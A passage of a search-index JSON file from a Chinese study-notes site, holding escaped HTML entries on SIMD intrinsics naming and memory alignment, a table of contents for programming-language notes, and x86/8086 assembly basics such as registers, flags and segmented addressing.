d</li> </ul> <p>\u4f8b\u5982\u5b58\u50a8\u4e86 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684 256 \u4f4d\u6570\u636e\u7684\u7c7b\u578b\u4e3a __m256d</p>"},{"location":"cs/hpc/hpc101/vectorized/#_5","title":"\u51fd\u6570","text":"<p>Intrinsics \u63d0\u4f9b\u7684\u51fd\u6570\u4e00\u822c\u4ee5 _mm[xxx]_name_PT \u7684\u5f62\u5f0f\u547d\u540d\uff1a</p> <ul> <li>[xxx]\uff1a\u64cd\u4f5c\u6570\u7684\u4f4d\u6570\uff0c\u82e5\u4e3a 128 \u5219\u7701\u7565</li> <li>name\uff1a\u51fd\u6570\u540d\u79f0\uff0c\u548c\u7528\u5904\u76f8\u5173</li> <li>P\uff1a\u5411\u91cf\u64cd\u4f5c\u8fd8\u662f\u6807\u91cf\u64cd\u4f5c<ul> <li>p \u8868\u793a\u5411\u91cf\u64cd\u4f5c\uff0c\u4f8b\u5982 _mm_add_ps \u5bf9\u56db\u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u540c\u65f6\u8fdb\u884c\u52a0\u6cd5</li> <li>s \u8868\u793a\u6807\u91cf\u64cd\u4f5c\uff0c\u4f8b\u5982 _mm_add_ss \u53ea\u5bf9\u6700\u4f4e\u4f4d\u7684\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8fdb\u884c\u52a0\u6cd5</li> <li>\u5bf9\u4e8e\u6574\u578b\u5411\u91cf\u64cd\u4f5c\uff0cMMX \u6307\u4ee4\u96c6\uff08\u64cd\u4f5c\u6570\u4e3a 64 \u4f4d\uff09\u4f7f\u7528 p\u3001\u5176\u5b83\u60c5\u51b5\u4e0b\u4e3a ep\uff0c\u4f8b\uff1a     <pre><code>__m64 _mm_add_pi8(__m64 a, __m64 b)\n__m128i _mm_add_epi8(__m128i a, __m128i b)\n</code></pre></li> </ul> </li> <li>T\uff1a\u64cd\u4f5c\u6570\u7684\u6570\u636e\u7c7b\u578b<ul> <li>\u6d6e\u70b9\u578b\uff1a\u5355\u7cbe\u5ea6\u4e3a s\u3001\u53cc\u7cbe\u5ea6\u4e3a d</li> <li>\u6574\u578b\uff1a\u6709\u7b26\u53f7 isize\u3001\u65e0\u7b26\u53f7 usize\uff0csize \u8868\u793a\u6bcf\u4e2a\u5355\u5143\u4e2d\u6574\u578b\u7684\u5bbd\u5ea6</li> </ul> </li> </ul> <p>\u4e3b\u8981\u5206\u7c7b\uff1a</p> <ul> <li>\u5b58/\u53d6\uff08store/load/set\uff09<ul> <li>load \u7c7b\u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u6307\u9488\uff0c\u8bfb\u53d6\u5bf9\u5e94\u4f4d\u7f6e\u5f00\u59cb\u7684\u5185\u5bb9\uff0c\u8fd4\u56de\u5bf9\u5e94\u6570\u636e\u7c7b\u578b\u7684\u53d8\u91cf<ul> <li>load \u8981\u6c42\u5185\u5b58\u5bf9\u9f50\uff08\u4e0b\u9762\u8bf4\uff09</li> <li>loadu \u4e0d\u8981\u6c42\u5185\u5b58\u5bf9\u9f50</li> <li>loadr \u53cd\u5411\u8bfb\u53d6</li> </ul> </li> <li>store \u7c7b\u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u6307\u9488\u8868\u793a\u5f00\u59cb\u5b58\u653e\u7684\u9996\u5730\u5740\uff0c\u548c\u4e00\u4e2a\u5f85\u5b58\u50a8\u7684\u53d8\u91cf\uff0c\u65e0\u8fd4\u56de\u503c<ul> <li>store \u8981\u6c42\u5185\u5b58\u5bf9\u9f50</li> <li>storeu \u4e0d\u8981\u6c42\u5185\u5b58\u5bf9\u9f50</li> <li>storer \u53cd\u5411\u5b58\u50a8</li> </ul> </li> <li>set \u7c7b\u51fd\u6570\u76f4\u63a5\u63a5\u6536\u591a\u4e2a\u5f85\u5b58\u50a8\u7684\u666e\u901a\u7c7b\u578b\u6570\u636e\uff0c\u8fd4\u56de\u5bf9\u5e94\u5927\u7c7b\u578b\u7684\u53d8\u91cf</li> </ul> </li> <li>\u7b97\u672f\u8fd0\u7b97\uff1aadd sub mul div sqrt \u52a0\u51cf\u4e58\u9664\u5f00\u6839\u53f7\uff0crcp \u6c42\u5012\u6570\u3001dp \u8ba1\u7b97\u70b9\u4e58 \u2026\u2026</li> <li>\u6bd4\u8f83\u8fd0\u7b97\uff1amax min cmpeq cmpge cmpgt cmple \u2026\u2026</li> <li>\u903b\u8f91\u8fd0\u7b97\uff1aand or xor\u3001andnot \u5148\u5bf9\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u6570\u6c42 not \u7136\u540e\u9010\u5206\u91cf and \u2026\u2026</li> <li>Swizzle \u8fd0\u7b97\uff1ashuffle blend movelh</li> </ul> <p>\u5b8c\u6574\u7684\u6307\u4ee4\u96c6\u5bf9\u5e94 Intrinsics \u51fd\u6570\u5217\u8868\u4ee5\u53ca\u7528\u6cd5\u7528\u9014\u89c1\uff1aIntel Intrinsics Guide</p>"},{"location":"cs/hpc/hpc101/vectorized/#_6","title":"\u5185\u5b58\u5bf9\u9f50","text":"<p>\u4e00\u822c\u7684\u5b58\u53d6\u64cd\u4f5c\u8981\u6c42\u5b58\u53d6\u7684\u5185\u5b58\u662f\u5bf9\u9f50\u7684\uff0c\u6bd4\u5982 _mm_load_ps \u8981\u6c42 16 \u4f4d\u5bf9\u9f50\uff08\u4e5f\u5c31\u662f\u8bf4\u4f20\u5165\u7684\u5730\u5740\u53ef\u4ee5\u88ab 16 \u6574\u9664\uff0c\u5373\u5730\u5740\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u4e3a 0\uff09\u3001_mm256_load_ps \u8981\u6c42 32 \u4f4d\u5bf9\u9f50\uff08\u5373\u5730\u5740\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u4e3a 0\uff0c\u5012\u6570\u7b2c\u4e8c\u4f4d\u4e3a\u5076\uff09</p> <p>\u5728\u6808\u4e0a\u5f3a\u5236\u8fdb\u884c 32 \u4f4d\u5185\u5b58\u5bf9\u9f50\uff1a</p> <ul> <li>gcc \u8bed\u6cd5\uff1a__attribute__ ((aligned (32))) double a[4]</li> <li>MSVC \u8bed\u6cd5\uff1a__declspec(align(32)) double a[4]</li> </ul> <p>\u8fd9\u6837\u5b9a\u4e49\u7684\u5305\u542b\u56db\u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6570\u7ec4 a \u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 _mm256_load_pd \u6765\u8bfb\u53d6</p> <p>\u66f4\u591a\u5173\u4e8e\u5185\u5b58\u5bf9\u9f50\uff0c\u89c1 \u4ece Eigen \u5411\u91cf\u5316\u8c08\u5185\u5b58\u5bf9\u9f50 - \u77e5\u4e4e</p>"},{"location":"cs/pl/","title":"Programming Language &amp; ISA","text":"<p>Abstract</p> <p>\u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u5b66\u4e60\u7f16\u7a0b\u8bed\u8a00\u65f6\u7684\u7b14\u8bb0</p> <p>\u6709\u7684\u662f\u7cfb\u7edf\u7684\u5b66\u4e60\u7b14\u8bb0\uff08\u6bd4\u5982 Haskell\uff09\uff0c\u6709\u7684\u662f\u96f6\u96f6\u6563\u6563\u7684\u77e5\u8bc6\u70b9 \u800c\u4e14\u8fd8\u6709\u4e00\u4e9b\u8bed\u8a00\u6ca1\u5199\u7b14\u8bb0\uff08\u9003</p>"},{"location":"cs/pl/#table-of-contents","title":"Table of Contents","text":"<ul> <li>C/C++<ul> <li>C \u8bed\u8a00\u6742\u9879</li> <li>C++ \u9762\u5411\u5bf9\u8c61</li> </ul> </li> <li>Python<ul> <li>Python \u8bed\u6cd5\u57fa\u7840</li> </ul> </li> <li>Rust<ul> <li>Rust \u57fa\u7840</li> <li>Rust \u6742\u9879</li> </ul> </li> <li>Haskell</li> <li>Chisel</li> <li>x86 Assembly</li> <li>RISC-V ISA<ul> <li>RISC-V \u975e\u7279\u6743\u7ea7 ISA</li> <li>RISC-V \u7279\u6743\u7ea7 ISA\uff08\u57fa\u7840&amp;\u4e2d\u65ad\uff09</li> <li>RISC-V \u7279\u6743\u7ea7 ISA\uff08\u9875\u8868\u76f8\u5173\uff09</li> </ul> </li> <li>\u7f16\u7a0b\u8bed\u8a00\u539f\u7406</li> </ul>"},{"location":"cs/pl/asm/","title":"x86 \u6c47\u7f16\u8bed\u8a00","text":"<p> \u7ea6 14421 \u4e2a\u5b57  203 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 51 \u5206\u949f</p> <p>Abstract</p> <ul> <li>\u81ea\u5b66\uff0c\u770b\u4e66\u300a\u6c47\u7f16\u8bed\u8a00\uff08\u7b2c4\u7248\uff09\u300b\u738b\u723d</li> <li>\u6d59\u6c5f\u5927\u5b66\u767d\u6d2a\u6b22\u8001\u5e08 \u201c\u6c47\u7f16\u8bed\u8a00\u201d\uff08\u5927\u4e00\u6625\u590f\uff09\u8bfe\u7a0b</li> <li>https://faydoc.tripod.com/cpu/index.htm</li> </ul>"},{"location":"cs/pl/asm/#_1","title":"\u57fa\u7840\u77e5\u8bc6","text":"\u4e00\u4e9b\u4ec5\u4f9b\u4e86\u89e3\u7684\u4e1c\u897f <ul> <li>\u673a\u5668\u8bed\u8a00\uff1a\u673a\u5668\u6307\u4ee4\uff08\u4e8c\u8fdb\u5236\u6570\uff09\u7684\u96c6\u5408</li> <li>CPU \u53ef\u4ee5\u6267\u884c\u673a\u5668\u6307\u4ee4\uff0c\u8fdb\u884c\u8fd0\u7b97</li> <li>\u6c47\u7f16\u8bed\u8a00\u4e3b\u4f53\u662f\u6c47\u7f16\u6307\u4ee4\uff0c\u6c47\u7f16\u6307\u4ee4\u901a\u8fc7\u7f16\u8bd1\u5668\u7f16\u8bd1\u4e3a\u673a\u5668\u7801\u7ed9\u8ba1\u7b97\u673a\u6267\u884c</li> <li>\u5bc4\u5b58\u5668\uff1aCPU \u4e2d\u53ef\u4ee5\u5b58\u50a8\u6570\u636e\u7684\u5668\u4ef6</li> <li>\u6c47\u7f16\u8bed\u8a00\u7ec4\u6210\uff1a<ul> <li>\u6c47\u7f16\u6307\u4ee4\uff1a\u6709\u5bf9\u5e94\u7684\u673a\u5668\u7801\uff0c\u662f\u673a\u5668\u7801\u7684\u52a9\u8bb0\u7b26</li> <li>\u4f2a\u6307\u4ee4\uff1a\u7531\u7f16\u8bd1\u5668\u6267\u884c\uff0c\u6ca1\u6709\u5bf9\u5e94\u673a\u5668\u7801</li> <li>\u5176\u4ed6\u7b26\u53f7\uff08+-*/\u7b49\uff09\uff1a\u7531\u7f16\u8bd1\u5668\u8bc6\u522b\uff0c\u6ca1\u6709\u5bf9\u5e94\u673a\u5668\u7801 </li> </ul> </li> <li>\u6307\u4ee4\u548c\u6570\u636e\u5728\u5185\u5b58\u4e2d\u5b58\u653e\uff0c\u88ab CPU \u4f7f\u7528</li> <li>\u6307\u4ee4\u548c\u6570\u636e\u5728\u5185\u5b58\u4e2d\u6ca1\u6709\u533a\u522b\uff0c\u90fd\u662f\u4e8c\u8fdb\u5236\u4fe1\u606f</li> <li>\u8ba1\u7b97\u673a\u6700\u5c0f\u4fe1\u606f\u5355\u4f4d\u662f bit\uff0c8 \u4e2a bit \u7ec4\u6210\u4e00\u4e2a Byte\uff0c\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u53ef\u4ee5\u5b58\u50a8\u4e00\u4e2a Byte\uff088 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff09\uff0c\u5b58\u50a8\u5355\u5143\u4ece 0 \u5f00\u59cb\u7f16\u53f7</li> <li>CPU \u901a\u8fc7\u603b\u7ebf\u4e0e\u5b58\u50a8\u5668\u82af\u7247\u4f20\u8f93\u5730\u5740\u3001\u6570\u636e\u3001\u63a7\u5236\u4fe1\u606f\uff08\u603b\u7ebf\uff1a\u8fde\u63a5 CPU \u548c\u5176\u4ed6\u82af\u7247\u7684\u4e00\u5806\u5bfc\u7ebf\uff09</li> <li>CPU \u4ece\u5185\u5b58\u8bfb\u53d6\u6570\u636e\u7684\u8fc7\u7a0b\uff1a<ul> <li>CPU \u901a\u8fc7\u5730\u5740\u7ebf\u5c06\u5730\u5740\u4fe1\u606f\u53d1\u51fa</li> <li>CPU \u901a\u8fc7\u63a7\u5236\u7ebf\u53d1\u51fa\u5185\u5b58\u8bfb\u547d\u4ee4\uff0c\u544a\u77e5\u6307\u5b9a\u5b58\u50a8\u5668\u82af\u7247\u8981\u4ece\u4e2d\u8bfb\u53d6\u6570\u636e</li> <li>\u5b58\u50a8\u5668\u5c06\u6240\u9700\u5730\u5740\u5904\u7684\u6570\u636e\u901a\u8fc7\u6570\u636e\u7ebf\u9001\u7ed9 CPU</li> </ul> </li> <li>CPU \u901a\u8fc7\u5730\u5740\u603b\u7ebf\u6307\u5b9a\u5b58\u50a8\u5355\u5143\u3002\u5730\u5740\u603b\u7ebf\u4e0a\u80fd\u4f20\u9001\u591a\u5c11\u4e2a\u4e0d\u540c\u7684\u4fe1\u606f\uff0cCPU \u5c31\u53ef\u4ee5\u5bf9\u591a\u5c11\u4e2a\u5b58\u50a8\u5355\u5143\u8fdb\u884c\u5bfb\u5740</li> <li>\u4e00\u4e2a CPU \u6709 n \u6839\u5730\u5740\u7ebf\uff0c\u5219\u8fd9\u4e2a CPU \u7684\u5730\u5740\u603b\u7ebf\u5bbd\u5ea6\u4e3a n\uff0c\u8fd9\u6837\u7684 CPU \u6700\u591a\u53ef\u4ee5\u5bfb\u627e 2<sup>n</sup> \u4e2a\u5185\u5b58\u5355\u5143</li> <li>CPU \u901a\u8fc7\u6570\u636e\u603b\u7ebf\u6765\u4e0e\u5185\u5b58\u6216\u5176\u4ed6\u5668\u4ef6\u4e4b\u95f4\u4f20\u9001\u6570\u636e\u3002\u6570\u636e\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU \u4e0e\u5916\u754c\u7684\u6570\u636e\u4f20\u9001\u901f\u5ea6</li> <li>8 \u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4ee5\u4f20\u9001\u4e00\u4e2a 8 \u4e3a\u4e8c\u8fdb\u5236\u6570\u636e\uff081 \u4e2a\u5b57\u8282\uff09\uff0c16 \u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4ee5\u4f20\u9001\u4e24\u4e2a\u5b57\u8282</li> <li>8088 CPU \u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a 8\uff0c8086 CPU \u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a 16</li> <li>CPU \u901a\u8fc7\u63a7\u5236\u603b\u7ebf\u5bf9\u5916\u90e8\u5668\u4ef6\u8fdb\u884c\u63a7\u5236\u3002\u63a7\u5236\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU \u5bf9\u5916\u90e8\u5668\u4ef6\u7684\u63a7\u5236\u80fd\u529b</li> <li>\u4e3b\u677f\u4e0a\u5668\u4ef6\u901a\u8fc7\u603b\u7ebf\u548c CPU \u76f8\u8fde</li> <li>CPU \u901a\u8fc7\u63d2\u5728\u6269\u5c55\u63d2\u69fd\u4e0a\u7684\u63a5\u53e3\u5361\u95f4\u63a5\u63a7\u5236\u5916\u8bbe</li> <li>\u5b58\u50a8\u5668\u82af\u7247\u4ece\u8bfb\u5199\u4e0a\u5206\u4e3a \u968f\u673a\u5b58\u50a8\u5668\uff08RAM\uff09\u548c \u53ea\u8bfb\u5b58\u50a8\u5668\uff08ROM\uff09<ul> <li>RAM \u53ef\u8bfb\u53ef\u5199\uff0c\u4f46\u5fc5\u987b\u5e26\u7535\u5b58\u50a8\uff0c\u5173\u673a\u540e\u5185\u5bb9\u4e22\u5931</li> <li>ROM \u53ea\u8bfb\u4e0d\u5199\uff0c\u4f46\u5173\u673a\u540e\u5185\u5bb9\u4e0d\u4e22\u5931</li> </ul> </li> <li>\u5b58\u50a8\u5668\u4ece\u529f\u80fd\u548c\u8fde\u63a5\u4e0a\u5206\u4e3a\uff1a<ul> <li>\u968f\u673a\u5b58\u50a8\u5668\uff1a\u5b58\u653e\u4f9b CPU \u4f7f\u7528\u7684\u7edd\u5927\u90e8\u5206\u7a0b\u5e8f\u548c\u6570\u636e\uff0c\u7531\u88c5\u5728\u4e3b\u677f\u4e0a\u7684 RAM \u548c\u63d2\u5728\u6269\u5c55\u63d2\u69fd\u4e0a\u7684 RAM \u7ec4\u6210 </li> <li>\u88c5\u6709 BIOS \u7684 ROM\uff1a\u5382\u5546\u63d0\u4f9b\u7684\u8f6f\u4ef6\u7cfb\u7edf\uff0c\u901a\u8fc7\u5b83\u5229\u7528\u8be5\u786c\u4ef6\u8bbe\u5907\u8fdb\u884c\u6700\u57fa\u672c\u7684\u8f93\u5165\u8f93\u51fa</li> <li>\u63a5\u53e3\u5361\u4e0a\u7684 RAM\uff1a\u67d0\u4e9b\u63a5\u53e3\u5361\u9700\u8981\u5bf9\u5927\u6279\u91cf\u8f93\u5165\u3001\u8f93\u51fa\u6570\u636e\u8fdb\u884c\u6682\u65f6\u5b58\u50a8\uff0c\u5728\u5176\u4e0a\u88c5\u6709 RAM\uff08\u5982\u663e\u5b58\uff09</li> </ul> </li> <li>CPU \u5728\u64cd\u63a7\u5b58\u50a8\u5668\u7684\u65f6\u5019\uff0c\u628a\u5b83\u4eec\u5f53\u4f5c\u5185\u5b58\u6765\u5bf9\u5f85\uff0c\u628a\u5b83\u4eec\u603b\u7684\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u5373\u5185\u5b58\u5730\u5740\u7a7a\u95f4</li> <li>\u6240\u6709\u7269\u7406\u5b58\u50a8\u5668\u88ab\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u6bcf\u4e2a\u7269\u7406\u5b58\u50a8\u5668\u5728\u5176\u4e2d\u5360\u6709\u4e00\u4e2a\u5730\u5740\u6bb5\uff0c\u5373\u5730\u5740\u7a7a\u95f4</li> </ul>"},{"location":"cs/pl/asm/#_2","title":"\u6570\u636e\u7684\u8868\u793a\u4e0e\u7ec4\u7ec7","text":"<p>\u4e8c\u8fdb\u5236\u6570\u672b\u5c3e\u7528 B/b \u4f5c\u540e\u7f00\uff0c\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u7528 H/h \u4f5c\u540e\u7f00\u4e14\u5982\u679c\u5f00\u5934\u4e3a\u5b57\u6bcd\u5219\u8981\u5728\u524d\u9762\u52a0\u4e00\u4e2a 0\uff0c\u516b\u8fdb\u5236\u672b\u5c3e\u7528 Q/q \u4f5c\u540e\u7f00\uff0c\u5341\u8fdb\u5236\u4e0d\u7528\u540e\u7f00</p> <p>\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u53eb\u4e00\u4f4d\uff08bit\uff09\uff0c\u56db\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u534a\u5b57\u8282\uff08nibble\uff09\uff0c\u516b\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u5b57\u8282\uff08byte\uff09\uff0c\u5341\u516d\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u5b57\uff08word\uff09\uff0c\u4e09\u5341\u4e8c\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u53cc\u5b57\uff08double word\uff09</p> <p>\u5b57\u7b26\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5355\u5f15\u53f7\u62ec\u5b57\u7b26\u6765\u8868\u793a\uff0c\u4e5f\u53ef\u4ee5\u7528\u5bf9\u5e94 ASCII \u7801\u6765\u8868\u793a</p>"},{"location":"cs/pl/asm/#_3","title":"\u5185\u90e8\u5bc4\u5b58\u5668","text":"<p>8086 \u5185\u90e8\u4e00\u5171\u6709 14 \u4e2a 16 \u4f4d\u5bc4\u5b58\u5668\uff0c8 \u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c4 \u4e2a\u6bb5\u5bc4\u5b58\u5668\uff0c2 \u4e2a\u63a7\u5236\u5bc4\u5b58\u5668</p> <ul> <li>\u901a\u7528\u5bc4\u5b58\u5668<ul> <li>\u6570\u636e\u5bc4\u5b58\u5668\uff1aax bx cx dx\uff0c\u7528\u4e8e\u5b58\u653e\u6570\u636e\u3002\u6bcf\u4e2a\u5bc4\u5b58\u5668\u4e3a 16 \u4f4d\uff0c\u53ef\u5206\u4e3a\u9ad8\u4f4e 8 \u4f4d\uff0c\u9ad8 8 \u4f4d\u5206\u522b\u4e3a ah bh ch dh\uff0c\u4f4e\u516b\u4f4d\u5206\u522b\u4e3a al bl cl dl\uff0c\u4e14\u5982\u679c\u53ea\u4fee\u6539\u516b\u4f4d\uff0c\u5219\u4e0d\u4f1a\u5f71\u54cd\u5230\u53e6\u5916\u516b\u4f4d\uff08\u6bd4\u5982\u6ea2\u51fa\u4e0d\u4f1a\u4ece al \u6ea2\u51fa\u5230 ah\uff09<ul> <li>ax\uff1a\u7d2f\u52a0\u5668\uff0c\u5e38\u7528\u4f5c\u7d2f\u52a0\uff0c\u4e14\u5728\u4e58\u9664\u6cd5\u3001\u4e32\u8fd0\u7b97\u3001IO \u4e2d\u6709\u4e13\u95e8\u7528\u5904</li> <li>bx\uff1a\u57fa\u5740\u5bc4\u5b58\u5668\uff0c\u5e38\u7528\u6765\u5b58\u653e\u5bfb\u5740\u7684\u57fa\u5740</li> <li>cx\uff1a\u8ba1\u6570\u5bc4\u5b58\u5668\uff0c\u5e38\u7528\u5728\u5faa\u73af\u4e2d\u4f5c\u4e3a\u8ba1\u6570\u5668</li> <li>dx\uff1a\u6570\u636e\u5bc4\u5b58\u5668\uff0c\u5b58\u653e IO \u7aef\u53e3\u5730\u5740\uff0c\u4e14\u5728\u53cc\u5b57\u8fd0\u7b97\u4e2d\u4f5c\u4e3a ax \u7684\u6269\u5c55\u9ad8\u5341\u516d\u4f4d</li> </ul> </li> <li>\u53d8\u5740\u5bc4\u5b58\u5668\uff1asi di\uff0c\u5e38\u7528\u6765\u5bfb\u5740<ul> <li>si\uff1a\u6e90\u53d8\u5740\u5bc4\u5b58\u5668</li> <li>di\uff1a\u76ee\u7684\u53d8\u5740\u5bc4\u5b58\u5668</li> </ul> </li> <li>\u6307\u9488\u5bc4\u5b58\u5668\uff1asp bp\uff0c\u5e38\u4e0e ss \u6784\u6210\u8fdc\u6307\u9488<ul> <li>sp\uff1a\u5806\u6808\u6307\u9488\u5bc4\u5b58\u5668\uff0css:sp \u6307\u5411\u5806\u6808\u9876\u7aef</li> <li>bp\uff1a\u57fa\u5740\u6307\u9488\u5bc4\u5b58\u5668\uff0c\u5e38\u7528 ss:bp \u6307\u5411\u5806\u6808\u4e2d\u6570\u636e</li> </ul> </li> </ul> </li> <li>\u6bb5\u5bc4\u5b58\u5668\uff1acs ss ds es<ul> <li>cs\uff1a\u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u4ee3\u7801\u6bb5\u7684\u6bb5\u5730\u5740</li> <li>ss\uff1a\u5806\u6808\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u5806\u6808\u6bb5\u7684\u6bb5\u5730\u5740</li> <li>ds\uff1a\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u6570\u636e\u6bb5\u7684\u6bb5\u5730\u5740</li> <li>es\uff1a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u9644\u52a0\u6570\u636e\u6bb5\u6bb5\u5730\u5740</li> </ul> </li> <li>\u63a7\u5236\u5bc4\u5b58\u5668\uff1aip fl<ul> <li>ip\uff1a\u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u4ee3\u7801\u6bb5\u7684\u504f\u79fb\u5730\u5740\uff0c cs:ip \u6307\u5411\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u9996\u5b57\u8282\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee ip</li> <li>fl\uff1a\u6807\u5fd7\u5bc4\u5b58\u5668\uff0c16 \u4f4d\u4f46\u53ea\u4f7f\u7528 9 \u4f4d\u8868\u793a 6 \u4e2a\u72b6\u6001\u6807\u5fd7\u548c 3 \u4e2a\u63a7\u5236\u6807\u5fd7\uff08df if tf\uff09<ul> <li>of\uff1aoverflow flag \u6ea2\u51fa\u6807\u5fd7\uff0c\u7b2c 11 \u4f4d\uff0c\u8868\u793a\u8fd0\u7b97\u662f\u5426\u6ea2\u51fa</li> <li>df\uff1adirection flag \u65b9\u5411\u6807\u5fd7\uff0c\u7b2c 10 \u4f4d\uff0c\u6807\u5fd7\u5b57\u7b26\u4e32\u5904\u7406\u6307\u4ee4\u4e2d\u5904\u7406\u4fe1\u606f\u7684\u65b9\u5411</li> <li>if\uff1ainterrupt flag \u4e2d\u65ad\u6807\u5fd7\uff0c\u7b2c 9 \u4f4d\uff0c\u662f\u5426\u5141\u8bb8\u5916\u90e8\u786c\u4ef6\u4e2d\u65ad</li> <li>tf\uff1atrace flag \u8ddf\u8e2a\u6807\u5fd7\uff0c\u7b2c 8 \u4f4d\uff0cCPU \u662f\u5426\u8fdb\u5165\u5355\u6b65\u5de5\u4f5c\u72b6\u6001</li> <li>sf\uff1asign flag \u7b26\u53f7\u6807\u5fd7\uff0c\u7b2c 7 \u4f4d\uff0c\u8fd0\u7b97\u7ed3\u679c\u7684\u7b26\u53f7\uff081 \u8868\u793a\u8d1f\uff09</li> <li>zf\uff1azero flag \u96f6\u6807\u5fd7\uff0c\u7b2c 6 \u4f4d\uff0c\u8fd0\u7b97\u7ed3\u679c\u662f\u5426\u4e3a 0</li> <li>af\uff1aauxiliary carry flag \u8f85\u52a9\u8fdb\u4f4d\u6807\u5fd7\uff0c\u7b2c 4 \u4f4d\uff0c\u8bb0\u5f55\u8fd0\u7b97\u65f6\u7b2c\u4e09\u4f4d\u662f\u5426\u5411\u5de6\u4fa7\u4ea7\u751f\u8fdb\u501f\u4f4d</li> <li>pf\uff1aparity flag \u5947\u5076\u6807\u5fd7\uff0c\u7b2c 2 \u4f4d\uff0c\u7ed3\u679c\u64cd\u4f5c\u6570\u4e2d\u4f4e 8 \u4f4d 1 \u7684\u4e2a\u6570\u662f\u5426\u4e3a\u5076\u6570</li> <li>cf\uff1acarry flag \u8fdb\u4f4d\u6807\u5fd7\uff0c\u7b2c 0 \u4f4d\uff0c\u8fd0\u7b97\u65f6\u6700\u9ad8\u4f4d\u662f\u5426\u5411\u5de6\u4fa7\u6709\u8fdb\u501f\u4f4d</li> </ul> </li> </ul> </li> </ul> <p>80386 32 \u4f4d\u5bc4\u5b58\u5668\u4e00\u5171\u6709 16 \u4e2a</p> <ul> <li>\u901a\u7528\u5bc4\u5b58\u5668<ul> <li>eax ebx ecx edx\uff0c\u53ef\u4ee5\u4f7f\u7528\u4f8b\u5982 ax \u8868\u793a\u4f4e 16 \u4f4d\uff0cah al \u5206\u522b\u8868\u793a\u4f4e 16 \u4f4d\u4e2d\u7684\u9ad8\u4f4e 8 \u4f4d</li> <li>esi edi\uff0c\u4f4e 16 \u4f4d\u4e3a si di</li> <li>esp ebp\uff0c\u4f4e 16 \u4f4d\u4e3a sp bp</li> </ul> </li> <li>\u6bb5\u5bc4\u5b58\u5668\uff1acs ss ds es fs gs\uff08\u591a\u4e86\u4e24\u4e2a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff09</li> <li>\u63a7\u5236\u5bc4\u5b58\u5668\uff1aeip eflags</li> </ul>"},{"location":"cs/pl/asm/#8086","title":"8086 \u5185\u5b58\u7ec4\u7ec7","text":"<p>\u53ef\u8bbf\u95ee\u7684\u5185\u5b58\u4e00\u5171\u6709 1MB\uff0c\u5341\u516d\u8fdb\u5236\u8868\u793a\u4e3a 00000h~FFFFFh\uff0c\u8fd9\u6837\u7528 20 \u4f4d\u8868\u793a\u7684\u5730\u5740\u79f0\u4e3a\u7269\u7406\u5730\u5740</p> <p>\u5bfb\u5740\u65f6\u4f7f\u7528\u7684\u662f \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u5f62\u5f0f\u7684\u903b\u8f91\u5730\u5740\uff0c\u5bf9\u5e94\u7684\u7269\u7406\u5730\u5740\u4e3a \u6bb5\u5730\u5740*16+\u504f\u79fb\u5730\u5740\uff0c\u6c47\u7f16\u91cc\u5199\u6210 \u6bb5\u5730\u5740:[\u504f\u79fb\u5730\u5740]\u3002\u540c\u6837\u4e5f\u5bb9\u6613\u770b\u51fa\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u5bf9\u5e94\u7684\u903b\u8f91\u5730\u5740\u8868\u793a\u5e76\u4e0d\u552f\u4e00</p>"},{"location":"cs/pl/asm/#_4","title":"\u6307\u4ee4\u7cfb\u7edf\u4e0e\u5bfb\u5740\u65b9\u5f0f","text":"<p>\u6c47\u7f16\u6307\u4ee4\u4e00\u822c\u7531\u64cd\u4f5c\u7801\uff08opcode\uff09\u548c\u64cd\u4f5c\u6570\uff08operand\uff09\u6784\u6210\uff0c\u4efb\u4f55\u6307\u4ee4\u90fd\u6709\u64cd\u4f5c\u7801\uff0c\u64cd\u4f5c\u6570\u7684\u4e2a\u6570\u4e0d\u4e00\u5b9a</p>"},{"location":"cs/pl/asm/#_5","title":"\u64cd\u4f5c\u6570\